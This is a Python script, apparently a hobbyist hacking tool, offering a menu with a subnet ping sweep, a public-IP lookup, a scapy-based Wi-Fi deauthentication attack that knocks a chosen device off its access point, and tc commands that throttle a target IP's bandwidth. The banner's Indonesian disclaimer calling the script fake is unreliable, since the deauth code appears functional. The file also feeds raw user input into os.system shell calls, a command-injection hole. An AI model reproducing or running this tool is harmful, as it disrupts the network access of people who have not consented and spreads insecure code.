import os
import time
import threading
import requests
import netifaces
import socket
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
from colorama import Fore, Style, init
from tqdm import tqdm

init(autoreset=True)

def display_banner():
    banner = r"""
  __      __             _                 _     _       _       
  \ \    / /            | |               | |   | |     | |      
   \ \  / /__  _ __ ___ | |__   ___  _ __| |__ | | __ _| |_ ___ 
    \ \/ / _ \| '_ ` _ \| '_ \ / _ \| '__| '_ \| |/ _` | __/ _ \
     \  / (_) | | | | | | |_) | (_) | |  | | | | | (_| | ||  __/
      \/ \___/|_| |_| |_|_.__/ \___/|_|  |_| |_|_|\__,_|\__\___|
    """
    print(Fore.CYAN + banner)
    
    print(Fore.YELLOW + "╔══════════════════════════════════════════════╗")
    print(Fore.YELLOW + "║                  Author by:                  ║")
    print(Fore.YELLOW + "║                 Mr.4Rex_503                  ║")
    print(Fore.YELLOW + "╠══════════════════════════════════════════════╣")
    print(Fore.YELLOW + "║  Maaf, skrip ini palsu maka jangan digunakan ║")
    print(Fore.YELLOW + "╚══════════════════════════════════════════════╝")

def animate_login():
    print(Fore.YELLOW + "🔑 Logging in...\n")
    
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                    Login Animation                          ║")
    print(Fore.CYAN + "╠══════════════════════════════════════════════════════════════╣")
    print(Fore.CYAN + "║   Please wait while we log you in...                       ║")
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════════════╝\n")
    
    for i in tqdm(range(3), desc="Loading", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(1)

    print(Fore.GREEN + "✔️ Login successful!\n")

def get_local_ip():
    interfaces = netifaces.interfaces()
    local_ip = None
    
    for interface in interfaces:
        if interface != 'lo':
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                local_ip = addresses[netifaces.AF_INET][0]['addr']
                break  

    print(Fore.YELLOW + "\n🌐 Retrieving Local Network IP Address...\n")
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                    Local Network IP Address                 ║")
    print(Fore.CYAN + "╠══════════════════════════════════════════════════════════════╣")
    
    if local_ip:
        print(Fore.CYAN + "║   Local IP Address    │   Status                           ║")
        print(Fore.CYAN + "╠═══════════════════════╪══════════════════════════════════════╣")
        print(Fore.GREEN + f"║ {local_ip:<20} │   Successfully retrieved IP address  ║")
    else:
        print(Fore.RED + "║ No local IP address found!                                   ║")
    
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════════════╝")

    return local_ip

def scan_network(local_ip):
    network = local_ip.split('.')[:-1]
    network = '.'.join(network) + '.'
    print(Fore.YELLOW + "\n🔍 Scanning network for connected devices...\n")
    
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                     Connected Devices                      ║")
    print(Fore.CYAN + "╠══════════════════════════════════════════════════════════════╣")
    print(Fore.CYAN + "║   IP Address        │        Hostname                       ║")
    print(Fore.CYAN + "╠═════════════════════╪══════════════════════════════════════╣")
    
    for i in range(1, 255):
        ip = network + str(i)
        response = os.system(f"ping -c 1 {ip} > /dev/null")
        if response == 0:
            hostname = "No hostname found"
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                pass
            
            print(Fore.GREEN + f"║ {ip:<18} │ {hostname:<40} ║")
    
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════════════╝")

def check_wifi_ip(local_ip):
    wifi_ip = get_wifi_ip()

    print(Fore.YELLOW + "\n🔍 Checking if the local IP matches the Wi-Fi network IP...\n")
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                 Local IP and Wi-Fi Network Comparison       ║")
    print(Fore.CYAN + "╠══════════════════════════════════════════════════════════════╣")
    print(Fore.CYAN + "║   Local IP Address     │   Wi-Fi IP Address     │   Result    ║")
    print(Fore.CYAN + "╠═══════════════════════╪═════════════════════════╪══════════════╣")
    
    if local_ip == wifi_ip:
        result = Fore.GREEN + "✔️ Match"
    else:
        result = Fore.RED + "❌ No Match"

    print(Fore.GREEN + f"║ {local_ip:<20} │ {wifi_ip:<20} │ {result:<12} ║")
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════════════╝")

def get_wifi_ip():
    response = requests.get('http://ipinfo.io/json')
    data = response.json()
    wifi_ip = data['ip']

    print(Fore.YELLOW + "\n🌐 Retrieving Wi-Fi Network IP Address...\n")
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                    Wi-Fi Network IP Address                 ║")
    print(Fore.CYAN + "╠══════════════════════════════════════════════════════════════╣")
    print(Fore.CYAN + "║   Wi-Fi IP Address    │   Details                           ║")
    print(Fore.CYAN + "╠═══════════════════════╪══════════════════════════════════════╣")
    print(Fore.GREEN + f"║ {wifi_ip:<20} │   Successfully retrieved IP address  ║")
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════════════╝")

    return wifi_ip

def deauth_attack(interface, target_mac, gateway_mac):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    
    print(Fore.YELLOW + "\n🚨 Preparing to perform deauthentication attack...\n")
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                     Deauthentication Attack Details          ║")
    print(Fore.CYAN + "╠══════════════════════════════════════════════════════════════╣")
    print(Fore.CYAN + "║   Interface         │   Target MAC         │   Gateway MAC   ║")
    print(Fore.CYAN + "╠═════════════════════╪══════════════════════╪══════════════════╣")
    print(Fore.GREEN + f"║ {interface:<18} │ {target_mac:<20} │ {gateway_mac:<16} ║")
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════════════╝")
    
    sendp(packet, iface=interface, count=100, inter=0.1)
    print(Fore.RED + f"🚨 Deauthenticating {target_mac} from {gateway_mac}")

def limit_bandwidth(interface, target_ip, rate):
    os.system(f"tc qdisc del dev {interface} root")
    os.system(f"tc qdisc add dev {interface} root handle 1: htb default 12")
    os.system(f"tc class add dev {interface} parent 1: classid 1:12 htb rate {rate}kbit")
    os.system(f"tc filter add dev {interface} protocol ip parent 1: prio 1 u32 match ip dst {target_ip} flowid 1:12")
    print(Fore.YELLOW + f"📉 Limited bandwidth for {target_ip} to {rate}kbit on {interface}")

def display_menu():
    print(Fore.CYAN + "\n📋 Menu:")
    print(Fore.MAGENTA + "╔══════════════════════════════════════════════╗")
    print(Fore.MAGENTA + "║               Menu Pilihan                   ║")
    print(Fore.MAGENTA + "╠══════════════════════════════════════════════╣")
    print(Fore.MAGENTA + "║ 1. Scan Network                              ║")
    print(Fore.MAGENTA + "║ 2. Check Wi-Fi IP                            ║")
    print(Fore.MAGENTA + "║ 3. Perform Deauth Attack                     ║")
    print(Fore.MAGENTA + "║ 4. Limit Bandwidth                           ║")
    print(Fore.MAGENTA + "║ 5. Exit                                      ║")
    print(Fore.MAGENTA + "╚══════════════════════════════════════════════╝")

def main():
    os.system('clear')  
    display_banner()
    animate_login()
    
    local_ip = get_local_ip()
    print(Fore.GREEN + f"🌐 Local IP address: {local_ip}")

    while True:
        display_menu()
        choice = input(Fore.YELLOW + "Choose an option (1-5): ")

        if choice == '1':
            scan_thread = threading.Thread(target=scan_network, args=(local_ip,))
            scan_thread.start()
            scan_thread.join()
        elif choice == '2':
            check_wifi_ip(local_ip)
        elif choice == '3':
            print(Fore.YELLOW + "╔══════════════════════════════════════════════╗")
            print(Fore.YELLOW + "║           Deauth Attack Setup                ║")
            print(Fore.YELLOW + "╠══════════════════════════════════════════════╣")
            interface = input(Fore.YELLOW + "║ Enter your wireless interface (e.g., wlan0): ")
            target_mac = input(Fore.YELLOW + "║ Enter the target MAC address: ")
            gateway_mac = input(Fore.YELLOW + "║ Enter the gateway MAC address: ")
            print(Fore.YELLOW + "╚══════════════════════════════════════════════╝")
            deauth_attack(interface, target_mac, gateway_mac)

        elif choice == '4':
            print(Fore.YELLOW + "╔══════════════════════════════════════════════╗")
            print(Fore.YELLOW + "║           Bandwidth Limiting Setup           ║")
            print(Fore.YELLOW + "╠══════════════════════════════════════════════╣")
            interface = input(Fore.YELLOW + "║ Enter your network interface: ")
            target_ip = input(Fore.YELLOW + "║ Enter the target IP address: ")
            rate = input(Fore.YELLOW + "║ Enter the desired rate in kbit (e.g., 1000 for 1 Mbit): ")
            print(Fore.YELLOW + "╚══════════════════════════════════════════════╝")
            limit_bandwidth(interface, target_ip, rate)
        elif choice == '5':
            print(Fore.RED + "👋 Exiting the program. Goodbye!")
            time.sleep(1)
            os.system('clear')  
            print(Fore.CYAN + "Thank you for using the program! See you next time!")
            break
        else:
            print(Fore.RED + "❌ Invalid choice. Please select a valid option.")

if __name__ == '__main__':
    main()